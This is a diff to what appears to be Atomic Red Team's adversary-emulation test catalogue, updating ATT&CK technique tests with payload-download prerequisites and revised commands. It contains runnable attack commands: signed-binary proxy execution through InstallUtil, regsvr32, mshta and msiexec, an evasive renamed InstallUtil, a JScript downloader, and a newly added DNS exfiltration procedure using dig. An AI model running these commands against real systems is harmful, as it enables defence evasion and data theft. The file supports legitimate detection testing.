+          $InstallerAssemblyDir = "#{assembly_dir}"
+          $InstallerAssemblyFileName = "#{assembly_filename}"
+          $InstallerAssemblyFullPath = Join-Path -Path $InstallerAssemblyDir -ChildPath $InstallerAssemblyFileName
+
+          $CommandLine = "/? `"$InstallerAssemblyFullPath`""
+          $ExpectedOutput = 'Constructor_HelpText_'
+
+          $TestArgs = @{
+              OutputAssemblyDirectory = $InstallerAssemblyDir
+              OutputAssemblyFileName = $InstallerAssemblyFileName
+              InvocationMethod = '#{invocation_method}'
+              CommandLine = $CommandLine
+          }
+
+          $ActualOutput = Invoke-BuildAndInvokeInstallUtilAssembly @TestArgs
+
+          if ($ActualOutput -ne $ExpectedOutput) {
+              throw @"
+          InstallUtil HelpText property execution test failure. Installer assembly execution output did not match the expected output.
+          Expected: $ExpectedOutput
+          Actual: $ActualOutput
+          "@
+          }
+        cleanup_command: |
+          $InstallerAssemblyDir = "#{assembly_dir}"
+          $InstallerAssemblyFileName = "#{assembly_filename}"
+          $InstallerAssemblyFullPath = Join-Path -Path $InstallerAssemblyDir -ChildPath $InstallerAssemblyFileName
+
+          Remove-Item -Path $InstallerAssemblyFullPath
+    - name: InstallUtil evasive invocation
+      description: 'Executes an InstallUtil assembly by renaming InstallUtil.exe and
+        using a nonstandard extension for the assembly.
+
+'
+      supported_platforms:
+      - windows
+      input_arguments:
+        test_harness:
+          description: location of the test harness script - Invoke-BuildAndInvokeInstallUtilAssembly
+          type: Path
+          default: PathToAtomicsFolder\T1118\src\InstallUtilTestHarness.ps1
+      dependencies:
+      - description: InstallUtil test harness script must be installed at specified
+          location (#{test_harness})
+        prereq_command: if (Test-Path "#{test_harness}") {exit 0} else {exit 1}
+        get_prereq_command: |-
+          New-Item -Type Directory (split-path #{test_harness}) -ErrorAction ignore | Out-Null
+          Invoke-WebRequest 'https://github.com/redcanaryco/atomic-red-team/raw/master/atomics/T1118/src/InstallUtilTestHarness.ps1' -OutFile "#{test_harness}"
+      executor:
+        name: powershell
+        elevation_required: false
+        command: |
+          # Import the required test harness function, Invoke-BuildAndInvokeInstallUtilAssembly
+          . #{test_harness}
+
+          $InstallerAssemblyDir = "$Env:windir\System32\Tasks"
+          $InstallerAssemblyFileName = 'readme.txt'
+          $InstallerAssemblyFullPath = Join-Path -Path $InstallerAssemblyDir -ChildPath $InstallerAssemblyFileName
+
+          $CommandLine = "readme.txt"
+          $ExpectedOutput = 'Constructor_'
+
+          # Explicitly set the directory so that a relative path to readme.txt can be supplied.
+          Set-Location "$Env:windir\System32\Tasks"
+
+          Copy-Item -Path "$([System.Runtime.InteropServices.RuntimeEnvironment]::GetRuntimeDirectory())InstallUtil.exe" -Destination "$Env:windir\System32\Tasks\notepad.exe"
+
+          $TestArgs = @{
+              OutputAssemblyDirectory = $InstallerAssemblyDir
+              OutputAssemblyFileName = $InstallerAssemblyFileName
+              InvocationMethod = 'Executable'
+              CommandLine = $CommandLine
+              InstallUtilPath = "$Env:windir\System32\Tasks\notepad.exe"
+          }
+
+          $ActualOutput = Invoke-BuildAndInvokeInstallUtilAssembly @TestArgs -MinimumViableAssembly
+
+          if ($ActualOutput -ne $ExpectedOutput) {
+              throw @"
+          Evasive Installutil invocation test failure. Installer assembly execution output did not match the expected output.
+          Expected: $ExpectedOutput
+          Actual: $ActualOutput
+          "@
+          }
+        cleanup_command: |-
+          Remove-Item -Path "$Env:windir\System32\Tasks\readme.txt"
+          Remove-Item -Path "$Env:windir\System32\Tasks\readme.InstallLog"
+          Remove-Item -Path "$Env:windir\System32\Tasks\readme.InstallState"
+          Remove-Item -Path "$Env:windir\System32\Tasks\notepad.exe"
   T1152:
     technique:
       x_mitre_permissions_required:
@@ -21860,13 +22875,13 @@ execution:
       supported_platforms:
       - windows
       input_arguments:
-        local_file:
+        local_file_path:
           description: Create a local VBScript file
           type: path
           default: C:\Temp\mshta_notepad.vbs
       executor:
         name: command_prompt
-        command: 'mshta.exe vbscript:Execute("CreateObject(""Wscript.Shell"").Run(""{local_file_path}"")(window.close)")
+        command: 'mshta.exe vbscript:Execute("CreateObject(""Wscript.Shell"").Run(""#{local_file_path}"")(window.close)")
 
 '
     - name: Mshta executes VBScript to execute malicious command
@@ -22326,21 +23341,29 @@ execution:
       supported_platforms:
       - windows
       input_arguments:
-        file_name:
+        output_file:
           description: Location of the payload
           type: Path
-          default: T1121.dll
+          default: "%tmp%\\T1121.dll"
         source_file:
           description: Location of the CSharp source_file
           type: Path
           default: PathToAtomicsFolder\T1121\src\T1121.cs
+      dependency_executor_name: powershell
+      dependencies:
+      - description: The CSharp source file must exist on disk at specified location
+          (#{source_file})
+        prereq_command: 'if (Test-Path #{source_file}) {exit 0} else {exit 1}'
+        get_prereq_command: |-
+          New-Item -Type Directory (split-path #{source_file}) -ErrorAction ignore | Out-Null
+          Invoke-WebRequest "https://github.com/redcanaryco/atomic-red-team/raw/master/atomics/T1121/src/T1121.cs" -OutFile "#{source_file}"
       executor:
         name: command_prompt
         elevation_required: false
         command: |
-          C:\Windows\Microsoft.NET\Framework\v4.0.30319\csc.exe /r:System.EnterpriseServices.dll /target:library #{source_file}
-          C:\Windows\Microsoft.NET\Framework\v4.0.30319\regasm.exe /U #{file_name}
-        cleanup_command: 'del #{file_name}
+          C:\Windows\Microsoft.NET\Framework\v4.0.30319\csc.exe /r:System.EnterpriseServices.dll /out:"#{output_file}" /target:library #{source_file}
+          C:\Windows\Microsoft.NET\Framework\v4.0.30319\regasm.exe /U #{output_file}
+        cleanup_command: 'del #{output_file} >nul 2>&1
 
 '
     - name: Regsvs Uninstall Method Call Test
@@ -22351,26 +23374,36 @@ execution:
       supported_platforms:
       - windows
       input_arguments:
-        file_name:
+        output_file:
           description: Location of the payload
           type: Path
-          default: T1121.dll
+          default: "$Env:TEMP\\T1121.dll"
         source_file:
           description: Location of the CSharp source_file
           type: Path
           default: PathToAtomicsFolder\T1121\src\T1121.cs
+      dependency_executor_name: powershell
+      dependencies:
+      - description: The CSharp source file must exist on disk at specified location
+          (#{source_file})
+        prereq_command: 'if (Test-Path #{source_file}) {exit 0} else {exit 1}'
+        get_prereq_command: |-
+          New-Item -Type Directory (split-path #{source_file}) -ErrorAction ignore | Out-Null
+          Invoke-WebRequest "https://github.com/redcanaryco/atomic-red-team/raw/master/atomics/T1121/src/T1121.cs" -OutFile "#{source_file}"
       executor:
         name: powershell
-        elevation_required: false
+        elevation_required: true
         command: |
           $key = 'BwIAAAAkAABSU0EyAAQAAAEAAQBhXtvkSeH85E31z64cAX+X2PWGc6DHP9VaoD13CljtYau9SesUzKVLJdHphY5ppg5clHIGaL7nZbp6qukLH0lLEq/vW979GWzVAgSZaGVCFpuk6p1y69cSr3STlzljJrY76JIjeS4+RhbdWHp99y8QhwRllOC0qu/WxZaffHS2te/PKzIiTuFfcP46qxQoLR8s3QZhAJBnn9TGJkbix8MTgEt7hD1DC2hXv7dKaC531ZWqGXB54OnuvFbD5P2t+vyvZuHNmAy3pX0BDXqwEfoZZ+hiIk1YUDSNOE79zwnpVP1+BN0PK5QCPCS+6zujfRlQpJ+nfHLLicweJ9uT7OG3g/P+JpXGN0/+Hitolufo7Ucjh+WvZAU//dzrGny5stQtTmLxdhZbOsNDJpsqnzwEUfL5+o8OhujBHDm/ZQ0361mVsSVWrmgDPKHGGRx+7FbdgpBEq3m15/4zzg343V9NBwt1+qZU+TSVPU0wRvkWiZRerjmDdehJIboWsx4V8aiWx8FPPngEmNz89tBAQ8zbIrJFfmtYnj1fFmkNu3lglOefcacyYEHPX/tqcBuBIg/cpcDHps/6SGCCciX3tufnEeDMAQjmLku8X4zHcgJx6FpVK7qeEuvyV0OGKvNor9b/WKQHIHjkzG+z6nWHMoMYV5VMTZ0jLM5aZQ6ypwmFZaNmtL6KDzKv8L1YN2TkKjXEoWulXNliBpelsSJyuICplrCTPGGSxPGihT3rpZ9tbLZUefrFnLNiHfVjNi53Yg4='
           $Content = [System.Convert]::FromBase64String($key)
-          Set-Content key.snk -Value $Content -Encoding Byte
-          C:\Windows\Microsoft.NET\Framework\v4.0.30319\csc.exe /r:System.EnterpriseServices.dll /target:library /keyfile:key.snk #{source_file}
-          C:\Windows\Microsoft.NET\Framework\v4.0.30319\regsvcs.exe #{file_name}
-        cleanup_command: |-
-          del #{file_name} >$null 2>&1
-          del key.snk >$null 2>&1
+          Set-Content $env:Temp\key.snk -Value $Content -Encoding Byte
+          C:\Windows\Microsoft.NET\Framework\v4.0.30319\csc.exe /r:System.EnterpriseServices.dll /out:"#{output_file}" /target:library /keyfile:$env:Temp\key.snk #{source_file}
+          C:\Windows\Microsoft.NET\Framework\v4.0.30319\regsvcs.exe #{output_file}
+        cleanup_command: |
+          Remove-Item #{output_file} -ErrorAction Ignore | Out-Null
+          $parentpath = Split-Path -Path "#{output_file}"
+          Remove-Item $parentpath\key.snk -ErrorAction Ignore | Out-Null
+          Remove-Item $parentpath\T1121.tlb -ErrorAction Ignore | Out-Null
   T1117:
     technique:
       x_mitre_data_sources:
@@ -22452,7 +23485,14 @@ execution:
         filename:
           description: Name of the local file, include path.
           type: Path
-          default: PathToAtomicsFolder\T1117\RegSvr32.sct
+          default: PathToAtomicsFolder\T1117\src\RegSvr32.sct
+      dependency_executor_name: powershell
+      dependencies:
+      - description: Regsvr32.exe must exist on disk at specified location (#{filename})
+        prereq_command: 'if (Test-Path #{filename}) {exit 0} else {exit 1}'
+        get_prereq_command: |-
+          New-Item -Type Directory (split-path #{filename}) -ErrorAction ignore | Out-Null
+          Invoke-WebRequest "https://github.com/redcanaryco/atomic-red-team/raw/master/atomics/T1117/src/RegSvr32.sct" -OutFile "#{filename}"
       executor:
         name: command_prompt
         elevation_required: false
@@ -22470,7 +23510,7 @@ execution:
         url:
           description: URL to hosted sct file
           type: Url
-          default: https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/atomics/T1117/RegSvr32.sct
+          default: https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/atomics/T1117/src/RegSvr32.sct
       executor:
         name: command_prompt
         elevation_required: false
@@ -22489,11 +23529,19 @@ execution:
           description: Name of DLL to Execute, DLL Should export DllRegisterServer
           type: Path
           default: PathToAtomicsFolder\T1117\bin\AllTheThingsx86.dll
+      dependency_executor_name: powershell
+      dependencies:
+      - description: AllTheThingsx86.dll must exist on disk at specified location
+          (#{dll_name})
+        prereq_command: 'if (Test-Path #{dll_name}) {exit 0} else {exit 1}'
+        get_prereq_command: |-
+          New-Item -Type Directory (split-path #{dll_name}) -ErrorAction ignore | Out-Null
+          Invoke-WebRequest "https://github.com/redcanaryco/atomic-red-team/raw/master/atomics/T1117/bin/AllTheThingsx86.dll" -OutFile "#{dll_name}"
       executor:
         name: command_prompt
         elevation_required: false
-        command: '"IF "%PROCESSOR_ARCHITECTURE%"=="AMD64" (C:\Windows\syswow64\regsvr32.exe
-          /s #{dll_name}) ELSE ( regsvr32.exe /s #{dll_name} )"
+        command: 'IF "%PROCESSOR_ARCHITECTURE%"=="AMD64" (C:\Windows\syswow64\regsvr32.exe
+          /s #{dll_name}) ELSE ( regsvr32.exe /s #{dll_name} )
 
 '
   T1085:
@@ -22602,6 +23650,13 @@ execution:
           description: Local location of inf file
           type: string
           default: PathToAtomicsFolder\T1085\src\T1085.inf
+      dependency_executor_name: powershell
+      dependencies:
+      - description: Inf file must exist on disk at specified location (#{inf_to_execute})
+        prereq_command: 'if (Test-Path #{inf_to_execute}) {exit 0} else {exit 1}'
+        get_prereq_command: |-
+          New-Item -Type Directory (split-path #{inf_to_execute}) -ErrorAction ignore | Out-Null
+          Invoke-WebRequest "https://github.com/redcanaryco/atomic-red-team/raw/master/atomics/T1085/src/T1085.inf" -OutFile "#{inf_to_execute}"
       executor:
         name: command_prompt
         elevation_required: false
@@ -22620,6 +23675,13 @@ execution:
           description: Local location of inf file
           type: string
           default: PathToAtomicsFolder\T1085\src\T1085.inf
+      dependency_executor_name: powershell
+      dependencies:
+      - description: Inf file must exist on disk at specified location (#{inf_to_execute})
+        prereq_command: 'if (Test-Path #{inf_to_execute}) {exit 0} else {exit 1}'
+        get_prereq_command: |-
+          New-Item -Type Directory (split-path #{inf_to_execute}) -ErrorAction ignore | Out-Null
+          Invoke-WebRequest "https://github.com/redcanaryco/atomic-red-team/raw/master/atomics/T1085/src/T1085.inf" -OutFile "#{inf_to_execute}"
       executor:
         name: command_prompt
         elevation_required: false
@@ -22638,6 +23700,13 @@ execution:
           description: Local location of inf file
           type: string
           default: PathToAtomicsFolder\T1085\src\T1085_DefaultInstall.inf
+      dependency_executor_name: powershell
+      dependencies:
+      - description: Inf file must exist on disk at specified location (#{inf_to_execute})
+        prereq_command: 'if (Test-Path #{inf_to_execute}) {exit 0} else {exit 1}'
+        get_prereq_command: |-
+          New-Item -Type Directory (split-path #{inf_to_execute}) -ErrorAction ignore | Out-Null
+          Invoke-WebRequest "https://github.com/redcanaryco/atomic-red-team/raw/master/atomics/T1085/src/T1085_DefaultInstall.inf" -OutFile "#{inf_to_execute}"
       executor:
         name: command_prompt
         elevation_required: false
@@ -22657,6 +23726,13 @@ execution:
           description: Local location of inf file
           type: string
           default: PathToAtomicsFolder\T1085\src\T1085_DefaultInstall.inf
+      dependency_executor_name: powershell
+      dependencies:
+      - description: Inf file must exist on disk at specified location (#{inf_to_execute})
+        prereq_command: 'if (Test-Path #{inf_to_execute}) {exit 0} else {exit 1}'
+        get_prereq_command: |-
+          New-Item -Type Directory (split-path #{inf_to_execute}) -ErrorAction ignore | Out-Null
+          Invoke-WebRequest "https://github.com/redcanaryco/atomic-red-team/raw/master/atomics/T1085/src/T1085_DefaultInstall.inf" -OutFile "#{inf_to_execute}"
       executor:
         name: command_prompt
         elevation_required: false
@@ -22947,7 +24023,7 @@ execution:
         command: "C:\\Windows\\system32\\cmd.exe /Q /c echo #{command_to_execute}
           > #{script_to_create}\nC:\\Windows\\system32\\cmd.exe /Q /c #{script_to_create}
           \n"
-        cleanup_command: 'del #{script_to_create}
+        cleanup_command: 'del #{script_to_create} >nul 2>&1
 
 '
   T1035:
@@ -23172,6 +24248,13 @@ execution:
           description: PID of process receiving injection
           type: string
           default: 1000
+      dependency_executor_name: powershell
+      dependencies:
+      - description: T1218.dll must exist on disk at specified location (#{dll_payload})
+        prereq_command: 'if (Test-Path #{dll_payload}) {exit 0} else {exit 1}'
+        get_prereq_command: |-
+          New-Item -Type Directory (split-path #{dll_payload}) -ErrorAction ignore | Out-Null
+          Invoke-WebRequest "https://github.com/redcanaryco/atomic-red-team/raw/master/atomics/T1218/src/x64/T1218.dll" -OutFile "#{dll_payload}"
       executor:
         name: command_prompt
         elevation_required: true
@@ -23207,6 +24290,13 @@ execution:
           description: DLL to execute
           type: Path
           default: PathToAtomicsFolder\T1218\src\Win32\T1218-2.dll
+      dependency_executor_name: powershell
+      dependencies:
+      - description: T1218-2.dll must exist on disk at specified location (#{dll_payload})
+        prereq_command: 'if (Test-Path #{dll_payload}) {exit 0} else {exit 1}'
+        get_prereq_command: |-
+          New-Item -Type Directory (split-path #{dll_payload}) -ErrorAction ignore | Out-Null
+          Invoke-WebRequest "https://github.com/redcanaryco/atomic-red-team/raw/master/atomics/T1218/src/Win32/T1218-2.dll" -OutFile "#{dll_payload}"
       executor:
         name: command_prompt
         command: 'C:\Windows\SysWow64\Register-CimProvider.exe -Path #{dll_payload}
@@ -23223,6 +24313,11 @@ execution:
           description: MSI file to execute
           type: Path
           default: PathToAtomicsFolder\T1218\src\Win32\T1218.msi
+      dependency_executor_name: powershell
+      dependencies:
+      - description: T1218.msi must exist on disk at specified location (#{msi_payload})
+        prereq_command: 'if (Test-Path #{msi_payload}) {exit 0} else {exit 1}'
+        get_prereq_command: Write-Host "You must provide your own MSI"
       executor:
         name: command_prompt
         command: 'msiexec.exe /q /i "#{msi_payload}"
@@ -23257,6 +24352,13 @@ execution:
           description: DLL to execute
           type: Path
           default: PathToAtomicsFolder\T1218\src\Win32\T1218-2.dll
+      dependency_executor_name: powershell
+      dependencies:
+      - description: T1218-2.dll must exist on disk at specified location (#{dll_payload})
+        prereq_command: 'if (Test-Path #{dll_payload}) {exit 0} else {exit 1}'
+        get_prereq_command: |-
+          New-Item -Type Directory (split-path #{dll_payload}) -ErrorAction ignore | Out-Null
+          Invoke-WebRequest "https://github.com/redcanaryco/atomic-red-team/raw/master/atomics/T1218/src/Win32/T1218-2.dll" -OutFile "#{dll_payload}"
       executor:
         name: command_prompt
         command: 'msiexec.exe /y "#{dll_payload}"
@@ -23273,6 +24375,13 @@ execution:
           description: DLL to execute
           type: Path
           default: PathToAtomicsFolder\T1218\src\Win32\T1218-2.dll
+      dependency_executor_name: powershell
+      dependencies:
+      - description: T1218-2.dll must exist on disk at specified location (#{dll_payload})
+        prereq_command: 'if (Test-Path #{dll_payload}) {exit 0} else {exit 1}'
+        get_prereq_command: |-
+          New-Item -Type Directory (split-path #{dll_payload}) -ErrorAction ignore | Out-Null
+          Invoke-WebRequest "https://github.com/redcanaryco/atomic-red-team/raw/master/atomics/T1218/src/Win32/T1218-2.dll" -OutFile "#{dll_payload}"
       executor:
         name: command_prompt
         command: 'odbcconf.exe /S /A {REGSVR "#{dll_payload}"}
@@ -23290,6 +24399,13 @@ execution:
           description: Local location of inf file
           type: string
           default: PathToAtomicsFolder\T1218\src\Infdefaultinstall.inf
+      dependency_executor_name: powershell
+      dependencies:
+      - description: INF file must exist on disk at specified location (#{inf_to_execute})
+        prereq_command: 'if (Test-Path #{inf_to_execute}) {exit 0} else {exit 1}'
+        get_prereq_command: |-
+          New-Item -Type Directory (split-path #{inf_to_execute}) -ErrorAction ignore | Out-Null
+          Invoke-WebRequest "https://github.com/redcanaryco/atomic-red-team/raw/master/atomics/T1218/src/Infdefaultinstall.inf" -OutFile "#{inf_to_execute}"
       executor:
         name: command_prompt
         elevation_required: false
@@ -23749,6 +24865,13 @@ execution:
           description: Location of the project file
           type: Path
           default: PathToAtomicsFolder\T1127\src\T1127.csproj
+      dependency_executor_name: powershell
+      dependencies:
+      - description: Project file must exist on disk at specified location (#{filename})
+        prereq_command: 'if (Test-Path #{filename}) {exit 0} else {exit 1}'
+        get_prereq_command: |-
+          New-Item -Type Directory (split-path #{filename}) -ErrorAction ignore | Out-Null
+          Invoke-WebRequest "https://github.com/redcanaryco/atomic-red-team/raw/master/atomics/T1127/src/T1127.csproj" -OutFile "#{filename}"
       executor:
         name: command_prompt
         elevation_required: false
@@ -24367,6 +25490,18 @@ execution:
           description: Location of the test XSL script file on the local filesystem.
           type: Path
           default: PathToAtomicsFolder\T1220\src\msxslscript.xsl
+      dependency_executor_name: powershell
+      dependencies:
+      - description: XML file must exist on disk at specified location (#{xmlfile})
+        prereq_command: 'if (Test-Path #{xmlfile}) {exit 0} else {exit 1}'
+        get_prereq_command: |-
+          New-Item -Type Directory (split-path #{xmlfile}) -ErrorAction ignore | Out-Null
+          Invoke-WebRequest "https://github.com/redcanaryco/atomic-red-team/raw/master/atomics/T1220/src/msxslxmlfile.xml" -OutFile "#{xmlfile}"
+      - description: XSL file must exist on disk at specified location (#{xslfile})
+        prereq_command: 'if (Test-Path #{xslfile}) {exit 0} else {exit 1}'
+        get_prereq_command: |-
+          New-Item -Type Directory (split-path #{xslfile}) -ErrorAction ignore | Out-Null
+          Invoke-WebRequest "https://github.com/redcanaryco/atomic-red-team/raw/master/atomics/T1220/src/msxslscript.xsl" -OutFile "#{xslfile}"
       executor:
         name: command_prompt
         command: 'C:\Windows\Temp\msxsl.exe #{xmlfile} #{xslfile}
@@ -24410,6 +25545,13 @@ execution:
           description: Location of the test XSL script file on the local filesystem.
           type: path
           default: PathToAtomicsFolder\T1220\src\wmicscript.xsl
+      dependency_executor_name: powershell
+      dependencies:
+      - description: XSL file must exist on disk at specified location (#{local_xsl_file})
+        prereq_command: 'if (Test-Path #{local_xsl_file}) {exit 0} else {exit 1}'
+        get_prereq_command: |-
+          New-Item -Type Directory (split-path #{local_xsl_file}) -ErrorAction ignore | Out-Null
+          Invoke-WebRequest "https://github.com/redcanaryco/atomic-red-team/raw/master/atomics/T1220/src/wmicscript.xsl" -OutFile "#{local_xsl_file}"
       executor:
         name: command_prompt
         command: 'wmic.exe #{wmic_command} /FORMAT:#{local_xsl_file}
@@ -25372,8 +26514,8 @@ lateral-movement:
           pushd #{destination_path}
           echo var fileObject = WScript.createobject("Scripting.FileSystemObject");var newfile = fileObject.CreateTextFile("AtomicTestFileT1105.js", true);newfile.WriteLine("This is an atomic red team test file for T1105. It simulates how OSTap worms accross network shares and drives.");newfile.Close(); > AtomicTestT1105.js
           CScript.exe AtomicTestT1105.js //E:JScript
-          del AtomicTestT1105.js /Q
-          del AtomicTestFileT1105.js /Q
+          del AtomicTestT1105.js /Q >nul 2>&1
+          del AtomicTestFileT1105.js /Q >nul 2>&1
           popd
   T1077:
     technique:
@@ -25894,10 +27036,10 @@ collection:
           wmic process list > %TEMP%\T1119_3.txt
           tree C:\AtomicRedTeam\atomics > %TEMP%\T1119_4.txt
         cleanup_command: |-
-          del %TEMP%\T1119_1.txt >$null 2>&1
-          del %TEMP%\T1119_2.txt >$null 2>&1
-          del %TEMP%\T1119_3.txt >$null 2>&1
-          del %TEMP%\T1119_4.txt >$null 2>&1
+          del %TEMP%\T1119_1.txt >nul 2>&1
+          del %TEMP%\T1119_2.txt >nul 2>&1
+          del %TEMP%\T1119_3.txt >nul 2>&1
+          del %TEMP%\T1119_4.txt >nul 2>&1
   T1115:
     technique:
       x_mitre_data_sources:
@@ -25956,7 +27098,7 @@ collection:
           dir | clip
           echo "T1115" > %temp%\T1115.txt
           clip < %temp%\T1115.txt
-        cleanup_command: 'del %temp%\T1115.txt
+        cleanup_command: 'del %temp%\T1115.txt >nul 2>&1
 
 '
     - name: PowerShell
@@ -26271,7 +27413,7 @@ collection:
           -file #{output_file}
 
 '
-        cleanup_command: 'del #{output_file}
+        cleanup_command: 'del #{output_file} >nul 2>&1
 
 '
   T1056:
@@ -26424,7 +27566,9 @@ collection:
       executor:
         name: bash
         elevation_required: false
-        command: screencapture
+        command: 'screencapture #{output_file}
+
+'
     - name: Screencapture (silent)
       description: 'Use screencapture command to collect a full desktop screenshot
 
@@ -26439,7 +27583,9 @@ collection:
       executor:
         name: bash
         elevation_required: false
-        command: screencapture -x
+        command: 'screencapture -x #{output_file}
+
+'
     - name: X Windows Capture
       description: 'Use xwd command to collect a full desktop screenshot and review
         file with xwud
@@ -26470,7 +27616,9 @@ collection:
           default: desktop.png
       executor:
         name: bash
-        command: import -window root
+        command: 'import -window root #{output_file}
+
+'
 exfiltration:
   '':
     technique:
@@ -26570,7 +27718,9 @@ exfiltration:
     atomic_tests:
     - name: Compress Data for Exfiltration With PowerShell
       description: "An adversary may compress data (e.g., sensitive documents) that
-        is collected prior to exfiltration \n"
+        is collected prior to exfiltration.\nWhen the test completes you should find
+        the files from the $env:USERPROFILE directory compressed in a file called
+        T1002-data-ps.zip in the $env:USERPROFILE directory \n"
       supported_platforms:
       - windows
       input_arguments:
@@ -26581,7 +27731,7 @@ exfiltration:
         output_file:
           description: Path where resulting compressed data should be placed
           type: Path
-          default: "$env:USERPROFILE\\data.zip"
+          default: "$env:USERPROFILE\\T1002-data-ps.zip"
       executor:
         name: powershell
         elevation_required: false
@@ -26593,7 +27743,9 @@ exfiltration:
 '
     - name: Compress Data for Exfiltration With Rar
       description: "An adversary may compress data (e.g., sensitive documents) that
-        is collected prior to exfiltration \n"
+        is collected prior to exfiltration.\nWhen the test completes you should find
+        the txt files from the %USERPROFILE% directory compressed in a file called
+        T1002-data.rar in the %USERPROFILE% directory \n"
       supported_platforms:
       - windows
       input_arguments:
@@ -26608,7 +27760,7 @@ exfiltration:
         output_file:
           description: Path where resulting compressed data should be placed
           type: Path
-          default: "%USERPROFILE%\\data.rar"
+          default: "%USERPROFILE%\\T1002-data.rar"
         rar_installer:
           description: Winrar installer
           type: Path
@@ -26628,7 +27780,7 @@ exfiltration:
       executor:
         name: command_prompt
         elevation_required: false
-        command: '"#{rar_exe}" a -r #{output_file} #{input_path} *#{file_extension}
+        command: '"#{rar_exe}" a -r #{output_file} #{input_path}\*#{file_extension}
 
 '
         cleanup_command: 'del /f /q /s #{output_file} >nul 2>&1
@@ -27008,14 +28160,6 @@ exfiltration:
           description: target SSH domain
           type: url
           default: target.example.com
-        user_name:
-          description: username for domain
-          type: string
-          default: atomic
-        password:
-          description: password for user
-          type: string
-          default: atomic
       executor:
         name: sh
         elevation_required: false
@@ -27097,6 +28241,22 @@ exfiltration:
           1500, $Data) }
 
 '
+    - name: Exfiltration Over Alternative Protocol - DNS
+      description: 'Exfiltration of specified file over DNS protocol.
+
+'
+      supported_platforms:
+      - linux
+      executor:
+        name: manual
+        steps: "1. On the adversary machine run the below command.\n\n    tshark -f
+          \"udp port 53\" -Y \"dns.qry.type == 1 and dns.flags.response == 0 and dns.qry.name
+          matches \".domain\"\" >> received_data.txt\n\n2. On the victim machine run
+          the below commands.\n\n    xxd -p input_file > encoded_data.hex | for data
+          in `cat encoded_data.hex`; do dig $data.domain; done\n    \n3. Once the
+          data is received, use the below command to recover the data.\n\n    cat
+          output_file | cut -d \"A\" -f 2 | cut -d \" \" -f 2 | cut -d \".\" -f 1
+          | sort | uniq | xxd -p -r"
 command-and-control:
   '':
     technique:
@@ -27749,8 +28909,8 @@ command-and-control:
           pushd #{destination_path}
           echo var fileObject = WScript.createobject("Scripting.FileSystemObject");var newfile = fileObject.CreateTextFile("AtomicTestFileT1105.js", true);newfile.WriteLine("This is an atomic red team test file for T1105. It simulates how OSTap worms accross network shares and drives.");newfile.Close(); > AtomicTestT1105.js
           CScript.exe AtomicTestT1105.js //E:JScript
-          del AtomicTestT1105.js /Q
-          del AtomicTestFileT1105.js /Q
+          del AtomicTestT1105.js /Q >nul 2>&1
+          del AtomicTestFileT1105.js /Q >nul 2>&1
           popd
   T1071:
     technique:
@@ -27993,7 +29153,7 @@ command-and-control:
         command: |
           echo var url = "#{file_url}", fso = WScript.CreateObject('Scripting.FileSystemObject'), request, stream; request = WScript.CreateObject('MSXML2.ServerXMLHTTP'); request.open('GET', url, false); request.send(); if (request.status === 200) {stream = WScript.CreateObject('ADODB.Stream'); stream.Open(); stream.Type = 1; stream.Write(request.responseBody); stream.Position = 0; stream.SaveToFile(filename, 1); stream.Close();} else {WScript.Quit(1);}WScript.Quit(0); > #{script_file}
           cscript //E:Jscript #{script_file}
-        cleanup_command: 'del #{script_file} /F /Q
+        cleanup_command: 'del #{script_file} /F /Q >nul 2>&1
 
 '
   T1032:
@@ -28158,7 +29318,7 @@ command-and-control:
       input_arguments:
         server_ip:
           description: The IP address of the listening server
-          type: ip
+          type: string
           default: 127.0.0.1
       executor:
         name: powershell
@@ -28215,11 +29375,11 @@ command-and-control:
       input_arguments:
         server_ip:
           description: The IP address or domain name of the listening server
-          type: ip
+          type: string
           default: 127.0.0.1
         server_port:
           description: The port for the C2 connection
-          type: port number
+          type: integer
           default: 80
       executor:
         name: powershell
@@ -28387,7 +29547,7 @@ command-and-control:
           %TEMP%\bitsadmindownload.html
 
 '
-        cleanup_command: 'del %TEMP%\bitsadmindownload.html
+        cleanup_command: 'del %TEMP%\bitsadmindownload.html >nul 2>&1
 
 '
     - name: Reach out to C2 Pointer URLs via powershell
